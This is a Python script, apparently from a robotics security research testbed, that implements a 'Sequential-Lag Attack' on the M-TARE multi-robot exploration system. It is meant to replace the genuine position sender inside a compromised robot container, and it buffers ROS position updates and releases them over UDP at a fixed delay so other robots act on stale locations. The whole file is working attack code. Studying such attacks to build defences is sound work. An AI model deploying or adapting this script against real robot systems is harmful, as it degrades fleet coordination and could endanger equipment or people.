#!/usr/bin/env python3
"""
Sequential-Lag Attack sender for M-TARE.

Drop-in replacement for mtare_position_sender.py.
Deploy this inside a compromised robot container instead of the original sender.

Usage (inside robot container):
    python3 sla_sender.py <robot_id> <target_ip> <target_port> [lambda_secs]

The script subscribes to the same ROS topic as the original sender but
buffers UDP packets and releases them one-by-one with a fixed delay of
lambda_secs between each release.
"""

import json
import socket
import sys
import time
import threading
from collections import deque

try:
    import rospy
    from geometry_msgs.msg import PointStamped
    from std_msgs.msg import Bool
    ROS_AVAILABLE = True
except ImportError:
    ROS_AVAILABLE = False
    print("[sla_sender] WARNING: rospy not found. Running in stub mode.", flush=True)


# ── Attack buffer ────────────────────────────────────────────────────────────

class ByDABuffer:
    """Thread-safe FIFO buffer that releases one packet every lambda_secs."""

    def __init__(self, lambda_secs: float, sock: socket.socket, target):
        self.lambda_secs = lambda_secs
        self.sock = sock
        self.target = target
        self._queue = deque()
        self._lock = threading.Lock()
        self._count_sent = 0
        self._thread = threading.Thread(target=self._drain_loop, daemon=True)
        self._thread.start()

    def push(self, data: bytes, generated_at: float):
        with self._lock:
            self._queue.append((data, generated_at))

    def _drain_loop(self):
        while True:
            item = None
            with self._lock:
                if self._queue:
                    item = self._queue.popleft()
            if item:
                data, generated_at = item
                delay = time.time() - generated_at
                self.sock.sendto(data, self.target)
                self._count_sent += 1
                if self._count_sent % 10 == 0:
                    print(
                        f"[SLA] sent packet #{self._count_sent} "
                        f"actual_delay={delay:.3f}s "
                        f"buffered={len(self._queue)}",
                        flush=True,
                    )
                time.sleep(self.lambda_secs)
            else:
                time.sleep(0.05)


# ── ROS sender (same interface as original) ──────────────────────────────────

class ByDASender:
    def __init__(self):
        args = rospy.myargv(argv=sys.argv) if ROS_AVAILABLE else sys.argv
        if len(args) < 4:
            print("Usage: sla_sender.py <robot_id> <target_ip> <target_port> [lambda_secs]")
            sys.exit(1)

        self.robot_id = int(args[1])
        self.target_ip = args[2]
        self.target_port = int(args[3])
        self.lambda_secs = float(args[4]) if len(args) > 4 else 1.0

        self.relay_comms = False
        self.count_received = 0

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.buffer = ByDABuffer(
            lambda_secs=self.lambda_secs,
            sock=self.sock,
            target=(self.target_ip, self.target_port),
        )

        print(f"[SLA sender robot{self.robot_id}] started", flush=True)
        print(f"[SLA sender robot{self.robot_id}] lambda={self.lambda_secs}s", flush=True)
        print(f"[SLA sender robot{self.robot_id}] target={self.target_ip}:{self.target_port}", flush=True)

        if ROS_AVAILABLE:
            rospy.init_node(f"sla_position_sender_{self.robot_id}", anonymous=False)
            rospy.Subscriber(
                f"/wheeled{self.robot_id}/position",
                PointStamped,
                self.position_callback,
                queue_size=1,
            )
            rospy.Subscriber(
                "/sensor_coverage_planner/relay_comms",
                Bool,
                self.relay_comms_callback,
                queue_size=1,
            )

    def relay_comms_callback(self, msg):
        self.relay_comms = msg.data

    def position_callback(self, msg):
        self.count_received += 1
        payload = {
            "robot_id":    self.robot_id,
            "x":           msg.point.x,
            "y":           msg.point.y,
            "z":           msg.point.z,
            "relay_comms": self.relay_comms,
            "stamp":       time.time(),
            "seq":         self.count_received,
            "attack":      "sla",
        }
        data = json.dumps(payload).encode("utf-8")
        self.buffer.push(data, generated_at=time.time())

    def spin(self):
        if ROS_AVAILABLE:
            rospy.spin()
        else:
            while True:
                time.sleep(1)


if __name__ == "__main__":
    ByDASender().spin()
